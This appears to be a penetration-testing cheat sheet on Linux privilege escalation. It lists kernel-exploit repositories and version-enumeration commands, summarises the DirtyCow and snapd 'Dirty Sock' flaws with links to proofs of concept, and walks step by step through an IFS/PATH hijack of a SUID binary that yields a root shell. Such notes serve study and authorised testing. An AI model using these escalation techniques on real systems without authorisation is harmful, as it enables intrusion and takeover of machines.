# Kernel Exploits

* Static table to use - https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/

* Use this to lookup vulnerable versions and exploits - https://github.com/SecWiki/linux-kernel-exploits, https://github.com/lucyoa/kernel-exploits

* Exploits can be found here
  - searchsploit - Kali
  - exploit-db
  - https://github.com/lucyoa/kernel-exploits


* By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the *OS*, *architecture* and *kernel version*.

```
$ uname -a
$ uanme -i
$ cat /etc/*-release
$ cat /proc/version
$ cat /etc/issue
$ lsb_release -a        # (Debian based OSs)
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

* Search for exploits
```
site:exploit-db.com kernel version
python linprivchecker.py extended
```


---

### DirtyCow exploit
* Linux Kernel <= 3.19.0-73.8

* A race condition was found in the way the Linux kernelâ€™s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system. It was one of the most serious privilege escalation vulnerability ever discovered and it affected almost all the major Linux distros.

* https://www.exploit-db.com/exploits/40839
* https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
---

## Distribution Specific Privilege Escalation

### Ubuntu vuln in snapd
* https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
* snapd serves up a REST API attached to a local UNIX_AF socket. Access control to restricted API functions is accomplished by querying the UID associated with any connections made to that socket. User-controlled socket peer data can be affected to overwrite a UID variable during string parsing in a for-loop. This allows any user to access any API function.
* With access to the API, there are multiple methods to obtain root. The exploits linked above demonstrate two possibilities.
---

### IFS Exploit

* The IFS (or Internal Field Separator) is used to separate words/ arguments.

* With an IFS set to ' ' (space) the command "ls -al" has the space between 'ls' and '-al' to separate the command to its argument.

* With an IFS set to ';' (semicolon) the command "ls;-al" will have the same effect as "ls -al", because we have said we wish to use the ';' instead of the space. So it uses a ';' to separate the command from its argument.
```
1) 	$ cat /home/nick/bin
2) 	...#!/bin/bash
3) 	.../bin/sh #this script will execute /bin/sh
4) 	$ ls -al /usr/local/date
5) 	---s--x--x 1 root root 21673 Mar 9 18:36 date
6) 	$ PATH=/home/nick:${PATH}
7) 	$ export PATH
8) 	$ IFS=/
9) 	$ export IFS
10) 	$ /usr/local/date
11) 	# whoami
12) 	root
```
    * Lines 1, 2, 3: the attacker creates a simple bash script that runs /bin/sh when executed.
    * Lines 4 and 5: the attacker checks the permissions for the suid program that calls /bin/date.
    * Lines 6 and 7: adds '/home/nick' to his PATH (where the 'bin' program is he wrote earlier).
    * Lines 8 and 9: He sets the IFS to '/' this means that instead of using a space, the '/' will be used, this
    means that the program instead of calling '/bin/date' will call 'bin date', because he has placed a
    program called 'bin' in the home directory (which is now in the PATH) when /usr/local/date is executed
    it will execute /home/nick/bin with the permissions of /usr/local/date - which means the
    attacker will get a root shell!
    * Lines 11, 12: The attacker runs 'whoami' to verify that he is root, line 12 confirms this.
